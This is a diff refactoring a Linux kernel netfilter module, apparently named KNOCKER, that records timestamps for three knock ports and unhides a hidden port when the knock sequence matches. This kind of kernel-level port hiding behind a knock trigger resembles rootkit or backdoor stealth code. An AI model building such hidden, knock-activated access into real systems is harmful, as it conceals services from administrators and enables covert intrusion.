@@ -37,6 +37,28 @@ static DECLARE_RWSEM(port_hidden_lock);
 static DECLARE_RWSEM(knock_lock);
 
 
+static void insert_knock(__be16 dport)
+{
+	time_t now = 0;
+	struct timespec tm;
+
+	getnstimeofday(&tm);
+	now = tm.tv_sec;
+	
+	switch (dport) {
+	case KPORT_1:
+		locked_assignment(knock_lock, port_knocks[0], now);
+		break;
+	case KPORT_2:
+		locked_assignment(knock_lock, port_knocks[1], now);
+		break;
+	case KPORT_3:
+		locked_assignment(knock_lock, port_knocks[2], now);
+		break;
+	}
+}
+
+
 static bool knock_ok(void)
 {	
 	int d0 = 0;
@@ -96,21 +118,11 @@ static void do_unhide_port(void)
 }
 
 
-static time_t get_time(void)
-{
-	struct timespec tm;
-
-	getnstimeofday(&tm);
-	return tm.tv_sec;
-	
-}
-
 static unsigned int check_dst_port(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
 	struct tcphdr *th;
 	struct iphdr *ih;
  	__be16 dport = 0;
-	time_t now = 0;
 
 	print_dbg("[KNOCKER] hook func called");
 
@@ -128,21 +140,10 @@ static unsigned int check_dst_port(void *priv, struct sk_buff *skb, const struct
 		return NF_ACCEPT;
 	}
 
-	now = get_time();
-	
-	switch (dport) {
-	case KPORT_1:
-		locked_assignment(knock_lock, port_knocks[0], now);
-		break;
-	case KPORT_2:
-		locked_assignment(knock_lock, port_knocks[1], now);
-		break;
-	case KPORT_3:
-		locked_assignment(knock_lock, port_knocks[2], now);
-		if (knock_ok() && is_port_hidden())
-			do_unhide_port();
-		break;
-	}
+	insert_knock(dport);
+
+	if (dport == KPORT_3 && knock_ok() && is_port_hidden())
+		do_unhide_port();
 
 	return NF_ACCEPT;
 }
